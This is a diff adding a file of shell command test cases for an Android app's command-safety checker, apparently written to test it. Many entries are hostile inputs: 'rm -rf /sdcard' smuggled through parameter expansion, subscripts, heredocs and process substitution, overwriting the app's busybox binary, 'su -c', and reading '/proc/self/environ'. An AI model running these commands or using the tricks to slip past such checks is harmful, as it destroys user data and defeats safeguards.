@@ -1,0 +1,285 @@
+echo ${x:-$(rm -rf /sdcard/DCIM)}
+====
+echo "${x:-$(rm -rf /sdcard/DCIM)}"
+====
+echo $(( $(rm -rf /sdcard/DCIM) ))
+====
+echo $[$(rm -rf /sdcard/DCIM)]
+====
+printf -v 'a[$(rm -rf /sdcard/DCIM)]' x
+====
+test -v 'a[$(rm -rf /sdcard/DCIM)]'
+====
+[ -v 'a[$(rm -rf /sdcard/DCIM)]' ]
+====
+echo ${x:=`rm -rf /sdcard`}
+====
+printf '#!/system/bin/sh\nrm -rf /sdcard/DCIM\n' > /data/user/0/io.github.namanwtf.atom/cache/root-busybox/vi
+====
+echo pwned > /data/user/0/io.github.namanwtf.atom/cache/root-busybox/busybox
+====
+echo x > /data/user/0/io.github.namanwtf.atom/cache/x.sh
+====
+printf 'x' >/data/user/0/io.github.namanwtf.atom/cache/a
+====
+echo x 1>/data/user/0/io.github.namanwtf.atom/cache/a
+====
+echo x >>/data/user/0/io.github.namanwtf.atom/cache/a
+====
+echo x >| /data/user/0/io.github.namanwtf.atom/cache/a
+====
+echo x &> /data/user/0/io.github.namanwtf.atom/cache/a
+====
+echo x <> /system/x
+====
+echo x >&/data/user/0/io.github.namanwtf.atom/cache/a
+====
+git -C /data/user/0/io.github.namanwtf.atom/files/atom4_workspace/r status
+====
+git -C /workspace/r diff --no-index a b
+====
+git -C /workspace/r help -w log
+====
+git --no-pager log -p
+====
+git log --textconv -p
+====
+git config --global core.pager x
+====
+git -c core.pager=x log
+====
+git config --get core.pager --file /x
+====
+logcat -f /data/user/0/io.github.namanwtf.atom/cache/x
+====
+logcat -d -f /sdcard/x
+====
+logcat -d --file=/sdcard/x
+====
+logcat -df /sdcard/x
+====
+dumpsys batterystats --reset
+====
+dumpsys procstats --clear
+====
+dumpsys sensorservice restrict .x.
+====
+dumpsys deviceidle force-inactive
+====
+dumpsys activity service com.android.systemui/.SystemUIService
+====
+settings get global x
+====
+settings --user 0 get secure x
+====
+ip netns exec foo rm -rf /sdcard
+====
+ip l s wlan0 down
+====
+ip link s wlan0 down
+====
+ip r a 1.2.3.0/24 dev wlan0
+====
+ip a fl dev wlan0
+====
+ip xfrm state deleteall
+====
+ip r flu all
+====
+rg --pre=sh x
+====
+rg --pre sh x
+====
+rg --pre-glob '*' --pre sh x
+====
+env
+====
+env -0
+====
+env rm -rf /sdcard
+====
+date -s 2020-01-01
+====
+date --set=2020
+====
+date 010101012020
+====
+date +%s
+====
+wm size
+====
+wm size 1x1
+====
+wm density 10
+====
+getprop
+====
+setprop x y
+====
+top -b -n 1
+====
+top -n1 -b > /sdcard/x
+====
+find / -fprint /sdcard/x
+====
+find / -name x -fprintf /sdcard/x %p
+====
+ss -K dst 1.1.1.1
+====
+dig -f /data/user/0/io.github.namanwtf.atom/shared_prefs/x.xml @1.2.3.4
+====
+ping -c 1 -p 41414141 1.2.3.4
+====
+file -C -m /data/local/tmp/magic
+====
+sort -o/sdcard/x y
+====
+sort --output /sdcard/x y
+====
+sort -mo /sdcard/x y
+====
+uniq in out
+====
+tee /sdcard/x
+====
+cat /dev/zero >/dev/stderr
+====
+sh -c 'ls'
+====
+sh -c 'ls; rm -rf /sdcard'
+====
+su -c 'ls'
+====
+su 0 -c 'ls'
+====
+su -c ls -la
+====
+sh -c "ls" x
+====
+busybox sh -c 'ls'
+====
+busybox sh -c 'rm -rf /sdcard'
+====
+toybox ls
+====
+/system/bin/ls
+====
+/system/bin/../../data/local/tmp/x
+====
+/system/bin/./rm -rf /sdcard
+====
+//system/bin/ls
+====
+ls; rm -rf /sdcard
+====
+ls # ; rm -rf /sdcard
+====
+ls
+rm -rf /sdcard
+====
+ls \
+; rm -rf /sdcard
+====
+cat <<EOF2
+$(rm -rf /sdcard)
+EOF2
+====
+cat <<'EOF2'
+$(rm -rf /sdcard)
+EOF2
+====
+sh -c 'cat <<E
+x
+E'
+====
+cat < /sdcard/x
+====
+cat <(rm -rf /sdcard)
+====
+cat <(ls)
+====
+echo `ls`
+====
+echo $(ls)
+====
+pm list packages
+====
+pm list packages; pm uninstall x
+====
+cmd package list packages
+====
+cmd package -l uninstall x
+====
+cmd -l
+====
+service call SurfaceFlinger 1008
+====
+service check foo
+====
+pgrep -f x
+====
+pidof x
+====
+ps -A
+====
+xxd -r a
+====
+expr 1 + 1
+====
+jq -n env
+====
+cd /sdcard && ls
+====
+pushd /sdcard
+====
+type rm
+====
+wait
+====
+: $(rm -rf /sdcard)
+====
+: ${x:-$(rm -rf /sdcard)}
+====
+test "${x:-$(rm -rf /sdcard)}"
+====
+lsof +D /
+====
+whereis -B /x -f ls
+====
+which -a ls
+====
+tail -f /dev/null
+====
+sleep 99999
+====
+cat /proc/self/environ
+====
+hostname
+====
+mount
+====
+ifconfig -a
+====
+ifconfig wlan0 down
+====
+ifconfig wlan0
+====
+netstat -tulpn
+====
+stat -c %n /sdcard
+====
+tree -o /sdcard/x
+====
+tree --output=/sdcard/x .
+====
+tr a b < /sdcard/x > /data/user/0/io.github.namanwtf.atom/cache/y
+====
+echo x > /data/user/0/io.github.namanwtf.atom/cache/../files/x
+====
+echo x > /data/user/0/io.github.namanwtf.atom/cache/./x
+====
+echo x > /data/user/0/io.github.namanwtf.atom/cache//x
+====
+echo x > /data/user/0/io.github.namanwtf.atom/cache
+====
+nslookup example.com
